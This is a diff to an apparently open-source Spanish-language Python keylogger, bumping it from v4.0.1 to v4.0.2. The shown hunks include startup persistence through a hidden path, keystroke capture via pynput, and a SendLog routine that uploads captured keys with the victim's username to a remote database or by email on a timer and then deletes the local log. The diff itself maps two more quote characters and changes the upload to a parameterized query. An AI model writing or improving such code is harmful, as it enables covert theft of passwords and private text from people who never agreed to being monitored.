@@ -10,7 +10,7 @@
 # █████═╝░█████╗░░░╚████╔╝░██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██████╔╝
 # ██╔═██╗░██╔══╝░░░░╚██╔╝░░██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗
 # ██║░╚██╗███████╗░░░██║░░░███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║
-# ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝  v4.0.1
+# ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝  v4.0.2
 
 # Librerías Utilizadas
 from pynput.keyboard import Key, Listener
@@ -28,10 +28,6 @@ import string
 import time
 import threading # Hilos
 import socket    # Librería verifica internet 
-
-
-
-
 
 def addStartup():  # function =  Iniciar automaticamente
     path = GetPathOcult()+ GetNameKey() # Path del Software completo
@@ -151,8 +147,8 @@ def KeyLogger():
             "'*'": "*",                     # *
             "'('": "(",                     # (
             "')'": ")",                     # )
-            #'"\'"': "'",                    # '
-            #"'\"'": '"',                    # "
+            '"\'"': "'",                    # '
+            "'\"'": '"',                    # "
             "'?'": "?",                     # ?
             "'='": "=",                     # =
             "'+'": "+",                     # +
@@ -343,26 +339,26 @@ def SendLog():
                 # Tiempo
                 T = datetime.datetime.now()
                 currentTime = T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B")+" "+ T.strftime("%I")+ ":"+ T.strftime("%M")+ " "+ T.strftime("%p")
-
-                sql = "INSERT INTO keyLog(l_user, l_time, l_log) VALUES('"+str(getuser())+"','"+currentTime+"','"+data+"')"    # Inserta nuevos datos 
-                #sql = "Update NameTabla SET key = '{}'WHERE id={}".format(name, id)
-                
+                sql = "INSERT INTO keyLog(l_user, l_time, l_log) VALUES(%s,%s,%s)"
                 try:
-                    cursor.execute(sql) # Ejecuta virtual
+                    cursor.execute(sql,(str(getuser()),currentTime,data)) # Ejecuta virtual
+
+
                     connection.commit() # Se guardan virtual 
                     print("[Database] Se subieron los datos correctamente")
-                        # Elimina Registro Key
+                    # Elimina Registro Key
                     connection.close()
                     os.remove(pathN)
                 except:
                     print("[Database] Error al subir los datos")
-
+            
             except:
                 try:
                     os.remove(pathN)  # Borra la carpeta por posible Errores
                 except:
                     pass
                 print("[DataBase] No se encuentra el archivo")
+            
 
         if (exito): # Solo se ejecutará si se inició correctamente la base de datos
             UpdateUser()
@@ -370,7 +366,7 @@ def SendLog():
 
     while (True):
         time.sleep(timeSend()*60) # Tiempo de espera por minutos 
-        #time.sleep(10) # Solo antigueeo 
+        #time.sleep(4) # Solo antigueeo 
         if VerificarConexion():
             if (GMailOrDataBase() == 0):    # Send mail
                 # Crea nombre del archivo
@@ -485,7 +481,7 @@ if __name__ == '__main__':
 #################################################################
 #                                                               #
 #                 Developed by SebastianEPH                     #
-#                                                   v4.0.1      #
+#                                                   v4.0.2      #
 #################################################################
 # NOTAS IMPORTANTES:
 #
